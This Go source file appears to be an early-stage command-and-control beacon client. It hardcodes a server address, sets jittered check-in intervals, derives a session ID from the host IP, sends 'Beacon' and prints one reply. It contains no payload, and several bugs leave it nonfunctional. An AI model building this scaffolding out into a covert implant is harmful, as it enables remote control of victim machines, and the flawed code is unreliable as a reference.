package main

import (
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	client    net.Conn
	sessionId string
	mu        sync.Mutex
	logStream *log.Logger
)

var CVER = "0.2.0"
var TYPE = "go"
var beaconIntervalInstance any = nil
var startTime = time.Now().UTC().Date
var exitProcess = false
var retryMode = false
var logEnabled = false
var address = "10.0.0.129"
var port = "54678"
var maxRetries = 5
var retryIntervals = [6]uint32{
	10000,
	30000,
	(1 * 60 * 1000),
	(2 * 60 * 1000),
	(4 * 60 * 1000),
	(6 * 60 * 1000),
}
var beaconMinInterval = 5 * 60 * 1000
var beaconMaxInterval = 45 * 60 * 1000

func writeLog(message string, v ...any) {
	// set location of log file
	var logpath = "logs/client.log"

	flag.Parse()
	var file, err1 = os.Create(logpath)

	if err1 != nil {
		logEnabled = false
		panic(err1)
	}
	if logStream == nil {
		logStream = log.New(file, "", log.LstdFlags|log.Lshortfile)
	}
	if v != nil {
		message = fmt.Sprintf(message, v)
	}

	logStream.Println(message)
}

func getSessionId() {
	mu.Lock()
	defer mu.Unlock()

	if client == nil {
		writeLog("Client is not properly initialized.")
		return
	}

	ipAddress := client.LocalAddr().String()
	if ipAddress == "::1" {
		ipAddress = "127.0.0.1"
	}

	writeLog("IP Address: %s\n", ipAddress)

	parts := strings.Split(ipAddress, ".")
	sumIp := 0
	for _, part := range parts {
		var partInt int
		fmt.Sscanf(part, "%d", &partInt)
		sumIp += partInt
	}

	data := fmt.Sprintf("%s<>%d", ipAddress, sumIp)
	hash := sha256.New()
	hash.Write([]byte(data))
	hashBytes := hash.Sum(nil)

	crypt := hex.EncodeToString(hashBytes)[:32]
	sessionId = strings.ToLower(crypt)

	writeLog("Session ID: %s\n", sessionId)
}

func connectServer() {
	// Connect to the server
	conn, err := net.Dial("tcp", address+":"+port)
	if err != nil {
		writeLog(err.Error())
		return
	}

	client = conn

	go getSessionId()

	// Send a response
	go sendResponse("Beacon", client)

	// Handle read response
	go handleConnection(client)
}

func sendResponse(resp string, conn net.Conn) {
	// Send some data to the server
	_, err := conn.Write([]byte(resp))
	if err != nil {
		fmt.Println(err)
		return
	}
}

func handleConnection(conn net.Conn) {
	// Close the connection when we're done
	defer conn.Close()

	// Read incoming data
	buf := make([]byte, 1024)
	_, err := conn.Read(buf)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Print the incoming data
	fmt.Printf("Received: %s", buf)
}

func main() {
	go connectServer()
}
